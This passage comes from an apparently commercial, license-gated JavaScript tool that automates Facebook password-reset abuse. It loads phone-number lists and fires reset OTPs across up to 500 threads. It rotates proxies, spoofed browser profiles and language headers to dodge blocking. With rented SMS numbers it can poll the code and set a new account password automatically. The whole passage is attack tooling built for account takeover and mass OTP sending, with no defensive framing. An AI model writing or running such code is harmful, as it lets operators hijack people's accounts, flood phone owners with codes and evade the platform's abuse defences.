  v1852.name = "0 Retries (No Retry - Fast)", v1852.value = 0x0;
  const v1853 = {};
  v1853.name = "1 Retry (Rotate Proxy Once)", v1853.value = 0x1;
  const v1854 = {};
  v1854.name = "2 Retries", v1854.value = 0x2;
  const v1855 = {};
  v1855.name = "3 Retries (Default)", v1855.value = 0x3;
  const v1856 = {};
  v1856.name = "5 Retries (Maximum)";
  v1856.value = 0x5;
  const v1857 = {};
  v1857.name = "⬅️ Go Back to Proxy Selection", v1857.value = "back";
  const v1858 = [v1852, v1853, v1854, v1855, v1856, v1857];
  return await selectOption("SELECT MAX RETRIES FOR BLOCKED/REJECTED NUMBERS", v1858);
}
let SKIP_PROXY_CHECK = false;
async function selectThreadCount() {
  const v1859 = {};
  v1859.name = "15 Threads", v1859.value = 0xf;
  const v1860 = {};
  v1860.name = "30 Threads", v1860.value = 0x1e;
  const v1861 = {};
  v1861.name = "50 Threads (Default)", v1861.value = 0x32;
  const v1862 = {};
  v1862.name = "100 Threads (Fast)";
  v1862.value = 0x64;
  const v1863 = {};
  v1863.name = "200 Threads (Extreme)", v1863.value = 0xc8;
  const v1864 = {};
  v1864.name = "✏️  Custom Threads (enter manually)", v1864.value = "custom";
  const v1865 = {};
  v1865.name = "⬅️ Go Back to Numbers Selection", v1865.value = "back";
  const v1866 = await selectOption("SELECT THREADS", [v1859, v1860, v1861, v1862, v1863, v1864, v1865]);
  if (v1866 === "back") return "back";
  if (v1866 === "custom") {
    process.stdout.write("[2J[H"), printHeader();
    const v1867 = await promptText("Enter custom thread count (1-500) [or type 'back']:", '50');
    if (v1867.toLowerCase() === "back") return "back";
    return Math.max(0x1, Math.min(0x1f4, parseInt(v1867) || 0x32));
  }
  return v1866;
}
async function selectProxyCheckOption() {
  if (!proxyManager.hasProxies) return true;
  const v1868 = {};
  v1868.name = "🔍 Check Proxies First (Test & Exclude Dead)", v1868.value = "check";
  const v1869 = {};
  v1869.name = "⚡ Start Immediately (Skip Proxy Check)";
  v1869.value = "skip";
  const v1870 = {};
  v1870.name = "⬅️ Go Back to Proxy Selection", v1870.value = "back";
  const v1871 = await selectOption("PROXY CONNECTIVITY CHECK", [v1868, v1869, v1870]);
  if (v1871 === "back") return "back";
  SKIP_PROXY_CHECK = v1871 === "skip";
  return v1871;
}
async function selectFacebookUrl() {
  const v1872 = {};
  v1872.name = "🎲 Random Rotate (Recommended)", v1872.value = "random";
  const v1873 = {};
  v1873.name = "🖥  Desktop (www.facebook.com)", v1873.value = "www.facebook.com";
  const v1874 = {};
  v1874.name = "📱 Mobile (m.facebook.com) ", v1874.value = "m.facebook.com";
  const v1875 = {};
  v1875.name = "⬅️ Go Back to Threads Selection";
  v1875.value = "back";
  const v1876 = [v1872, v1873, v1874, v1875];
  return await selectOption("SELECT DEVICE", v1876);
}
let SELECTED_ACCEPT_LANG = 'en';
function getLanguageHeader(v1877) {
  if (!v1877 || v1877 === 'en') return "en-US,en;q=0.9";
  if (v1877 === "auto") {
    const v1878 = ["en-US,en;q=0.9", "es-ES,es;q=0.9", "fr-FR,fr;q=0.9", "de-DE,de;q=0.9", "pt-BR,pt;q=0.9", "ar-SA,ar;q=0.9", "it-IT,it;q=0.9", "tr-TR,tr;q=0.9", "id-ID,id;q=0.9", "hi-IN,hi;q=0.9", "vi-VN,vi;q=0.9", "th-TH,th;q=0.9", "ru-RU,ru;q=0.9", "ja-JP,ja;q=0.9", "ko-KR,ko;q=0.9", "zh-CN,zh;q=0.9"];
    return v1878[Math.floor(Math.random() * v1878.length)];
  }
  return v1877;
}
function resolveLanguageForRequest(v1879 = null) {
  if (!SELECTED_ACCEPT_LANG || SELECTED_ACCEPT_LANG === 'en' || SELECTED_ACCEPT_LANG === "en-US,en;q=0.9") return "en-US,en;q=0.9";
  if (SELECTED_ACCEPT_LANG === "phone") return v1879 ? getPhoneLang(v1879) : "en-US,en;q=0.9";
  if (SELECTED_ACCEPT_LANG === "auto") return getLanguageHeader("auto");
  return SELECTED_ACCEPT_LANG;
}
async function selectAcceptLanguage() {
  const v1880 = {};
  v1880.name = "🌍 Auto Match Phone Country (194 Countries Auto-Detected)", v1880.value = "phone";
  const v1881 = {};
  v1881.name = "🎲 Random Rotate (Random Country Language per Number)", v1881.value = "auto";
  const v1882 = {};
  v1882.name = "🇬🇧 Default English (en-US,en;q=0.9) [Browser Standard / Matches Captures]", v1882.value = 'en';
  const v1883 = {};
  v1883.name = "🇪🇸 Spanish (es-ES,es;q=0.9)", v1883.value = "es-ES,es;q=0.9";
  const v1884 = {};
  v1884.name = "🇫🇷 French (fr-FR,fr;q=0.9)";
  v1884.value = "fr-FR,fr;q=0.9";
  const v1885 = {};
  v1885.name = "🇩🇪 German (de-DE,de;q=0.9)", v1885.value = "de-DE,de;q=0.9";
  const v1886 = {};
  v1886.name = "🇧🇷 Portuguese (pt-BR,pt;q=0.9)", v1886.value = "pt-BR,pt;q=0.9";
  const v1887 = {};
  v1887.name = "🇸🇦 Arabic (ar-SA,ar;q=0.9)", v1887.value = "ar-SA,ar;q=0.9";
  const v1888 = {};
  v1888.name = "🇮🇩 Indonesian (id-ID,id;q=0.9)", v1888.value = "id-ID,id;q=0.9";
  const v1889 = {};
  v1889.name = "🇮🇳 Hindi / Indian English (hi-IN,hi;q=0.9,en;q=0.8)", v1889.value = "hi-IN,hi;q=0.9,en;q=0.8";
  const v1890 = {};
  v1890.name = "🇵🇰 Urdu / Pakistani (ur-PK,ur;q=0.9,en;q=0.8)", v1890.value = "ur-PK,ur;q=0.9,en;q=0.8";
  const v1891 = {};
  v1891.name = "🇧🇩 Bengali (bn-BD,bn;q=0.9,en;q=0.8)", v1891.value = "bn-BD,bn;q=0.9,en;q=0.8";
  const v1892 = {};
  v1892.name = "🇹🇷 Turkish (tr-TR,tr;q=0.9)", v1892.value = "tr-TR,tr;q=0.9";
  const v1893 = {};
  v1893.name = "🇮🇹 Italian (it-IT,it;q=0.9)", v1893.value = "it-IT,it;q=0.9";
  const v1894 = {};
  v1894.name = "🇷🇺 Russian (ru-RU,ru;q=0.9)", v1894.value = "ru-RU,ru;q=0.9";
  const v1895 = {};
  v1895.name = "🇻🇳 Vietnamese (vi-VN,vi;q=0.9)", v1895.value = "vi-VN,vi;q=0.9";
  const v1896 = {};
  v1896.name = "🇹🇭 Thai (th-TH,th;q=0.9)", v1896.value = "th-TH,th;q=0.9";
  const v1897 = {};
  v1897.name = "✏️ Custom Input", v1897.value = "custom";
  const v1898 = {};
  v1898.name = "⬅️ Go Back to Device Selection", v1898.value = "back";
  const v1899 = [v1880, v1881, v1882, v1883, v1884, v1885, v1886, v1887, v1888, v1889, v1890, v1891, v1892, v1893, v1894, v1895, v1896, v1897, v1898];
  let v1900 = await selectOption("SELECT ACCEPT-LANGUAGE", v1899);
  if (v1900 === "back") return "back";
  if (v1900 === "custom") {
    process.stdout.write("[2J[H"), printHeader();
    const v1901 = await promptText("Enter custom Accept-Language (e.g. id-ID,id;q=0.9) [or 'back']:", "en-US,en;q=0.9");
    if (v1901.toLowerCase() === "back") return "back";
    v1900 = v1901 || "en-US,en;q=0.9";
  }
  return v1900;
}
function parseCustomBrowserInput(v1902, v1903 = false) {
  if (!v1902 || !v1902.trim()) return v1903 ? "ios+android" : "firefox+chrome";
  const v1904 = v1902.trim();
  if (v1904.toLowerCase() === "back") return "back";
  const v1905 = {};
  v1905['1'] = "random", v1905['01'] = "random", v1905['2'] = "firefox", v1905['02'] = "firefox", v1905['3'] = "chrome", v1905['03'] = "chrome", v1905['4'] = "duckduckgo", v1905['04'] = "duckduckgo", v1905['5'] = "edge", v1905['05'] = "edge", v1905['6'] = "brave", v1905['06'] = "brave", v1905['7'] = "opera", v1905['07'] = "opera", v1905['8'] = "vivaldi", v1905['08'] = "vivaldi", v1905['9'] = "linux", v1905['09'] = "linux", v1905['10'] = "safari", v1905['11'] = "ios", v1905['12'] = "android", v1905['13'] = "chrome+firefox+edge", v1905['14'] = "firefox+duckduckgo+brave";
  const v1906 = v1905,
    v1907 = {};
  v1907['1'] = "random_mobile", v1907['01'] = "random_mobile";
  v1907['2'] = "mweb_pixel8", v1907['02'] = "mweb_pixel8", v1907['3'] = "ios", v1907['03'] = "ios", v1907['4'] = "android", v1907['04'] = "android", v1907['5'] = "via_browser", v1907['05'] = "via_browser";
  v1907['6'] = "samsung", v1907['06'] = "samsung", v1907['7'] = "mobile_firefox", v1907['07'] = "mobile_firefox", v1907['8'] = "mobile_brave", v1907['08'] = "mobile_brave", v1907['9'] = "mobile_opera", v1907['09'] = "mobile_opera", v1907['10'] = "ios+android";
  const v1908 = v1907,
    v1909 = v1903 ? v1908 : v1906,
    v1910 = new Set(["random", "random_mobile", "firefox", "chrome", "duckduckgo", "edge", "brave", "opera", "vivaldi", "linux", "safari", "ios", "android", "mweb_pixel8", "via_browser", "samsung", "mobile_firefox", "mobile_brave", "mobile_opera"]),
    v1911 = {};
  v1911.ff = "firefox", v1911.google = "chrome", v1911.chromium = "chrome", v1911.ddg = "duckduckgo", v1911.duck = "duckduckgo", v1911.msedge = "edge", v1911.apple = "safari", v1911.mac = "safari", v1911.iphone = "ios", v1911.ipad = "ios", v1911.phone = "android", v1911.pixel = "mweb_pixel8", v1911.pixel8 = "mweb_pixel8", v1911.mweb = "mweb_pixel8", v1911.via = "via_browser", v1911.samsung = "samsung", v1911.mobile_firefox = "mobile_firefox", v1911.mobile_brave = "mobile_brave", v1911.mobile_opera = "mobile_opera", v1911.random_mobile = "random_mobile";
  const v1912 = v1911,
    v1913 = [],
    v1914 = v1904.split(/[\s,+/|]+/).filter(Boolean);
  for (const v1915 of v1914) {
    const v1916 = v1915.toLowerCase(),
      v1917 = v1916.match(/^(\d+)-(\d+)$/);
    if (v1917) {
      const v1918 = parseInt(v1917[0x1], 0xa),
        v1919 = parseInt(v1917[0x2], 0xa);
      for (let v1920 = Math.min(v1918, v1919); v1920 <= Math.max(v1918, v1919); v1920++) {
        const v1921 = v1909[String(v1920)];
        v1921 && v1921.split('+').forEach(v1922 => {
          if (!v1913.includes(v1922)) v1913.push(v1922);
        });
      }
      continue;
    }
    if (v1909[v1916]) {
      v1909[v1916].split('+').forEach(v1923 => {
        if (!v1913.includes(v1923)) v1913.push(v1923);
      });
      continue;
    }
    if (v1912[v1916]) {
      const v1924 = v1912[v1916];
      if (!v1913.includes(v1924)) v1913.push(v1924);
      continue;
    }
    if (v1910.has(v1916)) {
      if (!v1913.includes(v1916)) v1913.push(v1916);
      continue;
    }
  }
  return v1913.length > 0x0 ? v1913.join('+') : v1904;
}
async function selectBrowserProfile(v1925 = "⬅️ Go Back to Language Selection", v1926 = FB_HOST === "m.facebook.com" || SELECTED_LANG === "m.facebook.com") {
  const v1927 = {};
  v1927.name = "01. Random Mix", v1927.value = "random";
  const v1928 = {};
  v1928.name = "02. Mozilla Firefox", v1928.value = "firefox";
  const v1929 = {};
  v1929.name = "03. Google Chrome", v1929.value = "chrome";
  const v1930 = {};
  v1930.name = "04. DuckDuckGo", v1930.value = "duckduckgo";
  const v1931 = {};
  v1931.name = "05. Microsoft Edge", v1931.value = "edge";
  const v1932 = {};
  v1932.name = "06. Brave", v1932.value = "brave";
  const v1933 = {};
  v1933.name = "07. Opera", v1933.value = "opera";
  const v1934 = {};
  v1934.name = "08. Vivaldi", v1934.value = "vivaldi";
  const v1935 = {};
  v1935.name = "09. Linux OS", v1935.value = "linux";
  const v1936 = {};
  v1936.name = "10. Apple Safari", v1936.value = "safari";
  const v1937 = {};
  v1937.name = "11. Apple iOS", v1937.value = "ios";
  const v1938 = {};
  v1938.name = "12. Android Mobile", v1938.value = "android";
  const v1939 = {};
  v1939.name = "13. Desktop Trio Mix", v1939.value = "chrome+firefox+edge";
  const v1940 = {};
  v1940.name = "14. Stealth Mix", v1940.value = "firefox+duckduckgo+brave";
  const v1941 = {};
  v1941.name = "15. Custom Combination";
  v1941.value = "custom";
  const v1942 = {};
  v1942.name = v1925;
  v1942.value = "back";
  const v1943 = [v1927, v1928, v1929, v1930, v1931, v1932, v1933, v1934, v1935, v1936, v1937, v1938, v1939, v1940, v1941, v1942],
    v1944 = {};
  v1944.name = "01. Random Mobile Mix (Recommended)", v1944.value = "random_mobile";
  const v1945 = {};
  v1945.name = "02. Google Pixel 8/9 Mobile Web (Chrome 152)", v1945.value = "mweb_pixel8";
  const v1946 = {};
  v1946.name = "03. Apple iOS Safari (iPhone)", v1946.value = "ios";
  const v1947 = {};
  v1947.name = "04. Android Chrome", v1947.value = "android";
  const v1948 = {};
  v1948.name = "05. Via Browser (Android WebView)", v1948.value = "via_browser";
  const v1949 = {};
  v1949.name = "06. Samsung Internet", v1949.value = "samsung";
  const v1950 = {};
  v1950.name = "07. Android Firefox", v1950.value = "mobile_firefox";
  const v1951 = {};
  v1951.name = "08. Mobile Brave", v1951.value = "mobile_brave";
  const v1952 = {};
  v1952.name = "09. Mobile Opera", v1952.value = "mobile_opera";
  const v1953 = {};
  v1953.name = "10. Mobile Duo Mix (iOS + Android)", v1953.value = "ios+android";
  const v1954 = {};
  v1954.name = "11. Custom Combination", v1954.value = "custom";
  const v1955 = {};
  v1955.name = v1925, v1955.value = "back";
  const v1956 = [v1944, v1945, v1946, v1947, v1948, v1949, v1950, v1951, v1952, v1953, v1954, v1955],
    v1957 = v1926 ? "SELECT MOBILE BROWSER PROFILE" : "SELECT BROWSER PROFILE",
    v1958 = v1926 ? v1956 : v1943;
  const v1959 = await selectOption(v1957, v1958);
  if (v1959 === "back") return "back";
  if (v1959 === "custom") {
    console.log("   " + chalk.hex("#FCAF45").bold("💡 Custom Combination Input:")), console.log("   " + chalk.hex("#888888")(v1926 ? "Enter serial numbers (e.g. 2,3 or 2-5) or names (e.g. ios+android)" : "Enter serial numbers (e.g. 2,3 or 2-4) or names (e.g. firefox+chrome)") + '\x0a');
    const v1960 = await promptText("Enter combination [or 'back']:", v1926 ? "2,3" : "2,3");
    if (!v1960 || v1960.trim().toLowerCase() === "back") return await selectBrowserProfile(v1925, v1926);
    const v1961 = parseCustomBrowserInput(v1960, v1926);
    return console.log(chalk.green("\n   ✓ Selected: " + v1961 + '\x0a')), await sleep(0x2bc), v1961 || (v1926 ? "random_mobile" : "firefox");
  }
  return v1959;
}
async function selectProxySetup() {
  const v1962 = {};
  v1962.name = "🔗 Single Proxy String", v1962.value = "single";
  const v1963 = await selectOption("SELECT PROXY", [{
    'name': "✏️ Custom Proxy File Path",
    'value': "file_custom"
  }, {
    'name': "🔌 Direct Connection (No Proxy)",
    'value': "none"
  }, v1962, {
    'name': "⬅️ Go Back to Browser Selection",
    'value': "back"
  }]);
  if (v1963 === "back") return "back";
  if (v1963 === "none") return proxyManager.clear(), console.log(B("  ✓ Direct connection selected — no proxy will be used.")), await sleep(0x320), "none";
  if (v1963 === "single") {
    process.stdout.write("[2J[H"), printHeader(), console.log("   " + chalk.hex("#FCAF45").bold("ENTER PROXY") + '\x0a'), console.log("   " + chalk.hex("#888888")("Formats: ip:port:user:pass / socks5://user:pass@ip:port")), console.log("   " + chalk.hex("#888888")("         host:port@user:pass / http://user:pass@ip:port") + '\x0a');
    const v1964 = await promptText("Proxy string (or type 'back'):", '');
    if (v1964.toLowerCase() === "back") return "back";
    v1964 && (proxyManager.load(v1964), dbg("Single proxy loaded: " + proxyManager.proxies.length + " proxy"));
  } else {
    if (v1963 === "file_default" || v1963 === "file_custom") {
      let v1965 = "proxies.txt";
      if (v1963 === "file_custom") {
        process.stdout.write("[2J[H"), printHeader(), console.log("   " + chalk.hex("#FCAF45").bold("ENTER PROXY FILE") + '\x0a'), v1965 = await promptText("Proxy file path (or type 'back'):", "proxies.txt");
        if (v1965.toLowerCase() === "back") return "back";
      }
      const v1966 = path.resolve(v1965);
      fs.existsSync(v1966) ? (proxyManager.load(v1966), dbg("Proxy file loaded: " + proxyManager.proxies.length + " proxies")) : (fs.writeFileSync(v1966, ''), console.log(R("  [!] Created empty proxy file: " + v1965 + ". Running direct.")), await sleep(0x5dc));
    }
  }
  return v1963;
}
async function selectRetryCount() {
  const v1967 = {};
  v1967.name = "0 Retries  (Process once, no retries)", v1967.value = 0x0;
  const v1968 = {};
  v1968.name = "1 Retry    (Retry wrong OTP / timeout 1 time)", v1968.value = 0x1;
  const v1969 = {};
  v1969.name = "2 Retries  (Retry wrong OTP / timeout 2 times)";
  v1969.value = 0x2;
  const v1970 = {};
  v1970.name = "3 Retries  (Recommended - 3 times)", v1970.value = 0x3;
  const v1971 = {};
  v1971.name = "5 Retries  (Maximum effort - 5 times)";
  v1971.value = 0x5;
  const v1972 = {};
  v1972.name = "✏️  Custom   (enter manually)", v1972.value = "custom";
  const v1973 = {};
  v1973.name = "⬅️ Go Back to Proxy Selection", v1973.value = "back";
  const v1974 = [v1967, v1968, v1969, v1970, v1971, v1972, v1973];
  const v1975 = await selectOption("RETRY SETTINGS (Wrong OTP & Timeouts)", v1974);
  if (v1975 === "back") return "back";
  if (v1975 === "custom") {
    process.stdout.write("[2J[H"), printHeader();
    const v1976 = await promptText("Enter retry count for wrong OTP / timeouts (0-10) [or type 'back']:", '3');
    if (v1976.toLowerCase() === "back") return "back";
    return Math.max(0x0, Math.min(0xa, parseInt(v1976) || 0x0));
  }
  return v1975;
}
async function selectResendCount() {
  const v1977 = {};
  v1977.name = "0 Resends  (Send initial OTP once - Default)";
  v1977.value = 0x0;
  const v1978 = {};
  v1978.name = "✏️  Custom   (enter manually)", v1978.value = "custom";
  const v1979 = {};
  v1979.name = "⬅️ Go Back to Proxy Selection", v1979.value = "back";
  const v1980 = [v1977, v1978, v1979],
    v1981 = await selectOption("SELECT OTP RESEND COUNT", v1980);
  if (v1981 === "back") return "back";
  if (v1981 === "custom") {
    process.stdout.write("[2J[H"), printHeader();
    const v1982 = await promptText("Enter number of OTP resends per number (0-5) [or type 'back']:", '0');
    if (v1982.toLowerCase() === "back") return "back";
    return Math.max(0x0, Math.min(0x5, parseInt(v1982) || 0x0));
  }
  return v1981;
}
async function main() {
  syncUAAndHost();
  const v1983 = process.env.SKING_UI === '1';
  !v1983 && process.stdout.write("[2J[3J[H");
  const v1984 = process.argv.slice(0x2).filter(v1994 => !v1994.startsWith('--'));
  let v1985,
    v1986 = 0xf,
    v1987,
    v1988 = null,
    v1989 = null,
    v1990 = null,
    v1991 = null,
    v1992 = 0x0;
  if (v1984.length >= 0x1 && fs.existsSync(v1984[0x0])) {
    v1985 = v1984[0x0], v1986 = parseInt(v1984[0x1]) || 0x32, v1987 = v1984[0x0];
    v1984[0x3] && v1984[0x3].trim() && (proxyManager.load(v1984[0x3]), dbg("Proxy set: " + proxyManager.proxies.length + " proxies loaded"));
    v1984[0x5] && v1984[0x5].trim() && setSelectedBrowsers(v1984[0x5].trim());
    const v1995 = await validateLicense();
    !v1995 && (console.error(R("\n  ✗ License verification failed. Exiting.\n")), process.exit(0x1));
  } else {
    const v1996 = await validateLicense();
    !v1996 && (console.error(R("\n  ✗ License verification failed. Exiting.\n")), process.exit(0x1));
    await sleep(0x5dc);
    const v1997 = setInterval(() => {}, 0x2710);
    try {
      let v1998 = 0x1;
      while (true) {
        if (v1998 === 0x1) {
          const v1999 = await pickNumbersSource();
          if (v1999 && v1999.back) continue;
          v1985 = v1999.numbersFile, v1988 = v1999.nexaConfig, v1989 = v1999.twoOoConfig || null, v1990 = v1999.smsBowerConfig || null, v1991 = v1999.zenexConfig || null, v1998 = 0x2;
        } else {
          if (v1998 === 0x2) {
            const v2000 = await selectThreadCount();
            if (v2000 === "back") {
              v1998 = 0x1;
              continue;
            }
            v1986 = v2000, v1998 = 0x3;
          } else {
            if (v1998 === 0x3) {
              const v2001 = await selectFacebookUrl();
              if (v2001 === "back") {
                v1998 = 0x2;
                continue;
              }
              SELECTED_LANG = v2001, FB_HOST = SELECTED_LANG === "random" ? "www.facebook.com" : SELECTED_LANG, v1998 = 0x4;
            } else {
              if (v1998 === 0x4) {
                const v2002 = await selectAcceptLanguage();
                if (v2002 === "back") {
                  v1998 = 0x3;
                  continue;
                }
                SELECTED_ACCEPT_LANG = v2002, v1998 = 0x5;
              } else {
                if (v1998 === 0x5) {
                  const v2003 = await selectBrowserProfile();
                  if (v2003 === "back") {
                    v1998 = 0x4;
                    continue;
                  }
                  setSelectedBrowsers(v2003), syncUAAndHost(FB_HOST), v1998 = 0x6;
                } else {
                  if (v1998 === 0x6) {
                    const v2004 = await selectProxySetup();
                    if (v2004 === "back") {
                      v1998 = 0x5;
                      continue;
                    }
                    if (proxyManager.hasProxies) {
                      const v2005 = await selectProxyCheckOption();
                      if (v2005 === "back") {
                        v1998 = 0x6;
                        continue;
                      }
                    }
                    v1998 = 0x7;
                  } else {
                    if (v1998 === 0x7) {
                      const v2006 = await selectResendCount();
                      if (v2006 === "back") {
                        v1998 = 0x6;
                        continue;
                      }
                      v1992 = v2006, v1998 = 0x8;
                    } else {
                      if (v1998 === 0x8) {
                        const v2007 = !!(v1989 || v1990 || v1991);
                        if (v2007) {
                          const v2008 = v1989 ? v1989.provider === "voltx" ? "Voltx" : "Stex" : v1990 ? "SMS Bower" : "Zenex",
                            v2009 = {};
                          v2009.name = "Yes - Poll OTP & change password automatically", v2009.value = "yes";
                          const v2010 = {};
                          v2010.name = "No - Just trigger OTP, save to otp_sent.txt", v2010.value = 'no';
                          const v2011 = {};
                          v2011.name = "Go Back to Resend Count", v2011.value = "back";
                          const v2012 = await selectOption("AUTO CONFIRM OTP after Reset? [" + v2008 + ']', [v2009, v2010, v2011]);
                          if (v2012 === "back") {
                            v1998 = 0x7;
                            continue;
                          }
                          if (v2012 === "yes") {
                            const v2013 = await promptText("New password for confirmed accounts [default: Password@2026]:", "Password@2026");
                            if (v2013.toLowerCase() === "back") continue;
                            const v2014 = v2013 || "Password@2026";
                            if (v1989) {
                              const v2015 = v1989.provider === "voltx" ? "/MXS47FLFX0U/tnevs/@public/api/success-otp" : "/MXS47FLFX0U/tness/@public/api/success-otp";
                              v1989.autoConfirm = true, v1989.otpPath = v2015, v1989.newPassword = v2014;
                            } else {
                              if (v1990) v1990.autoConfirm = true, v1990.newPassword = v2014;else v1991 && (v1991.autoConfirm = true, v1991.newPassword = v2014);
                            }
                          } else {
                            if (v1989) v1989.autoConfirm = false;
                            if (v1990) v1990.autoConfirm = false;
                            if (v1991) v1991.autoConfirm = false;
                          }
                        }
                        v1998 = 0x9;
                      } else {
                        if (v1998 === 0x9) {
                          const v2016 = SELECTED_ACCEPT_LANG === 'en' ? "en-US" : SELECTED_ACCEPT_LANG === "phone" ? "Auto-Phone" : SELECTED_ACCEPT_LANG === "auto" ? "Random-Rotate" : SELECTED_ACCEPT_LANG.split(',')[0x0],
                            v2017 = {};
                          v2017.name = "🚀 LAUNCH", v2017.value = true;
                          const v2018 = {};
                          v2018.name = "⬅️ Go Back", v2018.value = "back";
                          const v2019 = await selectOption("Confirm: File=" + v1985 + ", Threads=" + v1986 + ", Browser=" + SELECTED_BROWSER + ", Lang=" + v2016 + ", Resends=" + v1992, [v2017, v2018]);
                          if (v2019 === "back") {
                            v1998 = v1989 || v1990 || v1991 ? 0x8 : 0x7;
                            continue;
                          }
                          !v2019 && (console.log(R("\n  [!] Launch cancelled. Exiting...\n")), process.exit(0x0));
                          v1987 = v1985, process.stdin.pause();
                          break;
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    } finally {
      clearInterval(v1997);
    }
  }
  let v1993 = true;
  while (v1993) {
    let v2020 = [];
    if (!v1988 && !v1989 && !v1990 && !v1991) {
      v2020 = loadNumbers(v1985);
      if (v2020.length === 0x0) {
        console.log(''), console.log(R("  ✗ No valid phone numbers found in: " + v1985)), console.log(Y("    Make sure the file contains numbers (one per line, 7-15 digits).\n"));
        const v2030 = {};
        v2030.name = "🔄 Go Home (Restart — pick a different file)", v2030.value = "home";
        const v2031 = await selectOption("What would you like to do?", [v2030, {
          'name': "❌ Exit",
          'value': "exit"
        }]);
        if (v2031 === "home") {
          const v2032 = await pickNumbersSource();
          v2032 && !v2032.back && (v1985 = v2032.numbersFile, v1988 = v2032.nexaConfig, v1989 = v2032.twoOoConfig || null, v1990 = v2032.smsBowerConfig || null, v1991 = v2032.zenexConfig || null);
          continue;
        } else process.exit(0x0);
      }
      if (proxyManager.hasProxies) {
        if (SKIP_PROXY_CHECK) console.log(B("\n  ⚡ Skipping proxy connectivity check — starting immediately!\n"));else {
          dbg("PROXY STATUS: " + proxyManager.proxies.length + " proxies loaded, testing connectivity...");
          const v2033 = await proxyManager.testConnectivity();
          if (!v2033) {
            const v2034 = await ask(Y("  [!] Proxy failed. Continue without proxy? (y/N): "));
            v2034.toLowerCase() !== 'y' && (console.log(G("\n  Aborted.\n")), process.exit(0x0)), dbg("USER CHOSE TO CLEAR PROXIES"), proxyManager.proxies = [];
          }
        }
      } else dbg("PROXY STATUS: No proxies loaded, using direct connection");
    }
    await sleep(0x3e8);
    const v2021 = await runPool(v2020, v1986, null, v1987, v1988, v1992, 0x3, v1989, v1990, v1991),
      v2022 = path.join(__dirname, "results"),
      v2023 = path.join(v2022, "otp_sent.txt"),
      v2024 = path.join(v2022, "checkpoint.txt"),
      v2025 = path.join(__dirname, "succesfull.txt");
    if (v2021.success.length > 0x0) {
      const v2035 = {};
      v2035.recursive = true;
      if (!fs.existsSync(v2022)) fs.mkdirSync(v2022, v2035);
      const v2036 = v2021.success.map(v2039 => v2039.split(" | ")[0x0].trim());
      fs.writeFileSync(v2023, v2036.join('\x0a') + '\x0a');
      const v2037 = new Date().toLocaleString(),
        v2038 = "\n=== Run: " + v2037 + " | Browser: " + SELECTED_BROWSER + " ===\n";
      fs.appendFileSync(v2025, v2038 + v2021.success.join('\x0a') + '\x0a');
    }
    if (v2021.captcha && v2021.captcha.length > 0x0) {
      const v2040 = {};
      v2040.recursive = true;
      if (!fs.existsSync(v2022)) fs.mkdirSync(v2022, v2040);
      fs.appendFileSync(v2024, v2021.captcha.join('\x0a') + '\x0a');
    }
    console.log(''), console.log(B("  ╔════════════════════════════════════════════╗")), console.log(B("  ║") + W.bold("  V6 API OTP — COMPLETE                     ") + B('║')), console.log(B("  ╠════════════════════════════════════════════╣")), console.log(B("  ║") + ('\x20\x20' + chalk.greenBright("OTP Sent") + "     " + chalk.greenBright(String(v2021.success.length).padStart(0x6))) + "                  " + B('║')), console.log(B("  ║") + ('\x20\x20' + G("No Account") + "   " + G(String(v2021.noAccount.length).padStart(0x6))) + "                  " + B('║')), console.log(B("  ║") + ('\x20\x20' + Y("No SMS") + "       " + Y(String(v2021.noSms.length).padStart(0x6))) + "                  " + B('║')), console.log(B("  ║") + ('\x20\x20' + R("Errors") + "       " + R(String(v2021.errors.length).padStart(0x6))) + "                  " + B('║')), console.log(B("  ║") + ('\x20\x20' + C("Data Used") + "    " + C((dataMB() + " MB").padEnd(0x14))) + "    " + B('║'));
    proxyManager.hasProxies && console.log(B("  ║") + ('\x20\x20' + C("Proxy") + "        " + C(proxyManager.getStatus().padEnd(0x14))) + "    " + B('║'));
    console.log(B("  ╚════════════════════════════════════════════╝\n"));
    const v2026 = {};
    v2026.name = "Reuse successful numbers (" + v2023 + ')', v2026.value = "reuse";
    const v2027 = {};
    v2027.name = "Go Home (Restart)", v2027.value = "home";
    const v2028 = {};
    v2028.name = "Exit", v2028.value = "exit";
    const v2029 = await selectOption("Processing Complete. What next?", [v2026, v2027, v2028]);
    if (v2029 === "reuse") {
      if (fs.existsSync(v2023)) {
        let v2041 = fs.readFileSync(v2023, "utf8").split('\x0a').map(v2042 => v2042.trim()).filter(v2043 => v2043.length > 0x5);
        fs.writeFileSync(v1985, v2041.join('\x0a')), fs.writeFileSync(v2023, ''), console.log("\n  [32m✓ Copied " + v2041.length + " successful numbers to " + v1985 + " and cleared " + v2023 + ".[0m\n");
      } else console.log("\n  [31m✗ No successful numbers found.[0m\n"), v1993 = false;
    } else {
      if (v2029 === "home") {
        const v2044 = setInterval(() => {}, 0x2710);
        try {
          const v2045 = await pickNumbersSource();
          v1985 = v2045.numbersFile, v1988 = v2045.nexaConfig, v1989 = v2045.twoOoConfig || null, v1990 = v2045.smsBowerConfig || null, v1991 = v2045.zenexConfig || null, v1986 = await selectThreadCount(), SELECTED_LANG = await selectFacebookUrl(), FB_HOST = SELECTED_LANG === "random" ? "www.facebook.com" : SELECTED_LANG, SELECTED_ACCEPT_LANG = await selectAcceptLanguage(), SELECTED_BROWSER = await selectBrowserProfile(), setSelectedBrowsers(SELECTED_BROWSER), syncUAAndHost(FB_HOST), await selectProxySetup();
          const v2046 = await promptText("Enter number of OTP resends per number [default: 0]:", '0');
          v1992 = parseInt(v2046) || 0x0, v1987 = v1985;
        } finally {
          clearInterval(v2044);
        }
      } else v1993 = false;
    }
  }
}
const v120 = {};
v120.seedSession = seedSession, v120.proxyManager = proxyManager, v120.searchAccount = searchAccount, v120.selectAccount = selectAccount, v120.getInitiateView = getInitiateView, v120.conversationalSupportQuery = conversationalSupportQuery, v120.sendOTP = sendOTP, v120.graphqlPost = graphqlPost, v120.buildParams = buildParams, v120.buildHeaders = buildHeaders, v120.mergeCookies = mergeCookies, v120.parseResp = parseResp, v120.getRandomClient = getRandomClient, v120.getSimOperators = getSimOperators, v120.detectCountry = detectCountry, v120.getPhoneLang = getPhoneLang, v120.resolveTimezone = resolveTimezone, v120.withHardTimeout = withHardTimeout, v120.isProxyLevelError = isProxyLevelError, v120.SELECTED_BROWSER = SELECTED_BROWSER, v120.proxyHttpsRequest = proxyHttpsRequest, v120.httpsGetPage = httpsGetPage, v120.httpsGetPageWithRedirects = httpsGetPageWithRedirects, v120.getPhoneCountry = getPhoneCountry, v120.getProxyCountry = getProxyCountry, v120.selectOption = selectOption, v120.promptText = promptText, v120.printHeader = printHeader, v120.validateLicense = 